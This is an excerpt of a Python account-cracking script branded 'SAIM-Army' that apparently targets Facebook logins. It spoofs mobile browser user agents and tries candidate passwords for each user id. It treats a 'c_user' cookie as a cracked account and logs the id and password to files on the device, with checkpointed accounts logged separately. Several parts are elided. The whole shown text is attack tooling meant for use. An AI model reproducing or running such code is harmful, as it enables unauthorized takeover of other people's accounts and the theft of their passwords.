...
for ua in range(1000):
      ...
      c='SM-S908U Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
...
def test(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            session = requests.Session()
            sys.stdout.write(f'\r\033[1;90m[\033[1;92mSAIM-Army\033[1;90m] \033[1;96m%s/%s\033[1;90m \033[1;90m[\033[1;92mOK:%s\033[1;90m] '%(loop,tl,len(oks))),
            sys.stdout.flush()
            ...
            'sec-ch-ua-full-version-list': '"Not:A-Brand";v="24.0.0.0", "Chromium";v="116.0.5615.137"',
            'sec-ch-ua-mobile': '?1',
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[65:80]
                print(f'\r\33[1;92m[SAIM-OK] '+cid+' ¤ '+ps+'\33[0;92m')
                oks.append(cid)
                open('/sdcard/SAIM-ok.txt', 'a').write(cid+' | '+ps+' | '+uid+'\n')
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[65:80]
                print(f"\r\33[1;92m[SAIM-CP] {uid} ¤ {ps}")
                open('/sdcard/i-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
